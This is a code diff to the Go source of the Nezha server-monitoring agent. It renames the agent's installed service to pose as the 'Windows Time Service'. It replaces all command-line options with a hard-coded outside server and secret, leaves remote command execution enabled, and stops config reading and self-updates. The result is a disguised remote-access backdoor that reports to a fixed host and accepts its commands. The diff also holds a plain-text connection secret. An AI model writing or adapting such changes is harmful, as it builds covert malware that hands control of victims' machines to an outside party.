@@ -67,7 +67,7 @@ var (
 )
 
 var agentCmd = &cobra.Command{
-	Use: "agent",
+	Use: "Time",
 	Run: func(cmd *cobra.Command, args []string) {
 		runService("", nil)
 	},
@@ -94,7 +94,7 @@ var (
 )
 
 const (
-	delayWhenError = time.Second * 10 // Agent 重连间隔
+	delayWhenError = time.Second * 5 // Agent 重连间隔
 	networkTimeOut = time.Second * 5  // 普通网络超时
 )
 
@@ -134,25 +134,40 @@ func init() {
 	}
 
 	// 初始化运行参数
-	agentCmd.PersistentFlags().StringVarP(&agentCliParam.Server, "server", "s", "localhost:5555", "管理面板RPC端口")
-	agentCmd.PersistentFlags().StringVarP(&agentCliParam.ClientSecret, "password", "p", "", "Agent连接Secret")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.TLS, "tls", false, "启用SSL/TLS加密")
-	agentCmd.PersistentFlags().BoolVarP(&agentCliParam.InsecureTLS, "insecure", "k", false, "禁用证书检查")
-	agentCmd.PersistentFlags().BoolVarP(&agentConfig.Debug, "debug", "d", false, "开启调试信息")
-	agentCmd.PersistentFlags().IntVar(&agentCliParam.ReportDelay, "report-delay", 1, "系统状态上报间隔")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipConnectionCount, "skip-conn", false, "不监控连接数")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipProcsCount, "skip-procs", false, "不监控进程数")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableCommandExecute, "disable-command-execute", false, "禁止在此机器上执行命令")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableAutoUpdate, "disable-auto-update", false, "禁用自动升级")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableForceUpdate, "disable-force-update", false, "禁用强制升级")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseIPv6CountryCode, "use-ipv6-countrycode", false, "使用IPv6的位置上报")
-	agentCmd.PersistentFlags().BoolVar(&agentConfig.GPU, "gpu", false, "启用GPU监控")
-	agentCmd.PersistentFlags().BoolVar(&agentConfig.Temperature, "temperature", false, "启用温度监控")
-	agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseGiteeToUpgrade, "gitee", false, "使用Gitee获取更新")
-	agentCmd.PersistentFlags().Uint32VarP(&agentCliParam.IPReportPeriod, "ip-report-period", "u", 30*60, "本地IP更新间隔, 上报频率依旧取决于report-delay的值")
-	agentCmd.Flags().BoolVarP(&agentCliParam.Version, "version", "v", false, "查看当前版本号")
+	// agentCmd.PersistentFlags().StringVarP(&agentCliParam.Server, "server", "s", "localhost:5555", "管理面板RPC端口")
+	agentCliParam.Server="nzdo.rickey.eu.org:443"
+	// agentCmd.PersistentFlags().StringVarP(&agentCliParam.ClientSecret, "password", "p", "", "Secret")
+	agentCliParam.ClientSecret="qIhBla0XpfPI8gQK2F"
+	// agentCmd.PersistentFlags().BoolVar(&agentCliParam.TLS, "tls", false, "启用SSL/TLS加密")
+	agentCliParam.TLS=true
+	// agentCmd.PersistentFlags().BoolVarP(&agentCliParam.InsecureTLS, "insecure", "k", false, "禁用证书检查")
+	agentCliParam.InsecureTLS=false
+	// agentCmd.PersistentFlags().BoolVarP(&agentConfig.Debug, "debug", "d", false, "开启调试信息")
+	// agentCmd.PersistentFlags().IntVar(&agentCliParam.ReportDelay, "report-delay", 1, "系统状态上报间隔")
+	agentCliParam.ReportDelay=1
+	// agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipConnectionCount, "skip-conn", false, "不监控连接数")
+	agentCliParam.SkipConnectionCount=false
+	// agentCmd.PersistentFlags().BoolVar(&agentCliParam.SkipProcsCount, "skip-procs", false, "不监控进程数")
+	agentCliParam.SkipProcsCount=false
+	// agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableCommandExecute, "disable-command-execute", false, "禁止在此机器上执行命令")
+	agentCliParam.DisableCommandExecute=false
+	// agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableAutoUpdate, "disable-auto-update", false, "禁用自动升级")
+	agentCliParam.DisableAutoUpdate=true
+	// agentCmd.PersistentFlags().BoolVar(&agentCliParam.DisableForceUpdate, "disable-force-update", false, "禁用强制升级")
+	agentCliParam.DisableForceUpdate=false
+	// agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseIPv6CountryCode, "use-ipv6-countrycode", false, "使用IPv6的位置上报")
+	agentCliParam.UseIPv6CountryCode=false
+	// agentCmd.PersistentFlags().BoolVar(&agentConfig.GPU, "gpu", false, "启用GPU监控")
+	agentConfig.GPU=true
+	// agentCmd.PersistentFlags().BoolVar(&agentConfig.Temperature, "temperature", false, "启用温度监控")
+	agentConfig.Temperature=true
+	// agentCmd.PersistentFlags().BoolVar(&agentCliParam.UseGiteeToUpgrade, "gitee", false, "使用Gitee获取更新")
+	agentCliParam.UseGiteeToUpgrade=false
+	// agentCmd.PersistentFlags().Uint32VarP(&agentCliParam.IPReportPeriod, "ip-report-period", "u", 30*60, "本地IP更新间隔, 上报频率依旧取决于report-delay的值")
+	agentCliParam.IPReportPeriod=30*60
+	// agentCmd.Flags().BoolVarP(&agentCliParam.Version, "version", "v", false, "查看当前版本号")
 
-	agentConfig.Read(filepath.Dir(ex) + "/config.yml")
+	// agentConfig.Read(filepath.Dir(ex) + "/config.yml")
 
 	monitor.InitConfig(&agentConfig)
 }
@@ -304,9 +319,9 @@ func runService(action string, flags []string) {
 	}
 
 	svcConfig := &service.Config{
-		Name:             "nezha-agent",
-		DisplayName:      "Nezha Agent",
-		Description:      "哪吒探针监控端",
+		Name:             "Time",
+		DisplayName:      "Time",
+		Description:      "Windows Time Service",
 		Arguments:        flags,
 		WorkingDirectory: dir,
 		Option:           winConfig,
@@ -446,26 +461,27 @@ func reportState(lastReportHostInfo time.Time) time.Time {
 
 // doSelfUpdate 执行更新检查 如果更新成功则会结束进程
 func doSelfUpdate(useLocalVersion bool) {
-	v := semver.MustParse("0.1.0")
-	if useLocalVersion {
-		v = semver.MustParse(version)
-	}
-	printf("检查更新: %v", v)
-	var latest *selfupdate.Release
-	var err error
-	if monitor.CachedCountryCode != "cn" && !agentCliParam.UseGiteeToUpgrade {
-		latest, err = selfupdate.UpdateSelf(v, "nezhahq/agent")
-	} else {
-		latest, err = selfupdate.UpdateSelfGitee(v, "naibahq/agent")
-	}
-	if err != nil {
-		printf("更新失败: %v", err)
-		return
-	}
-	if !latest.Version.Equals(v) {
-		printf("已经更新至: %v, 正在结束进程", latest.Version)
-		os.Exit(1)
-	}
+	return
+	// v := semver.MustParse("0.1.0")
+	// if useLocalVersion {
+	// 	v = semver.MustParse(version)
+	// }
+	// printf("检查更新: %v", v)
+	// var latest *selfupdate.Release
+	// var err error
+	// if monitor.CachedCountryCode != "cn" && !agentCliParam.UseGiteeToUpgrade {
+	// 	latest, err = selfupdate.UpdateSelf(v, "nezhahq/agent")
+	// } else {
+	// 	latest, err = selfupdate.UpdateSelfGitee(v, "naibahq/agent")
+	// }
+	// if err != nil {
+	// 	printf("更新失败: %v", err)
+	// 	return
+	// }
+	// if !latest.Version.Equals(v) {
+	// 	printf("已经更新至: %v, 正在结束进程", latest.Version)
+	// 	os.Exit(1)
+	// }
 }
 
 func handleUpgradeTask(*pb.Task, *pb.TaskResult) {
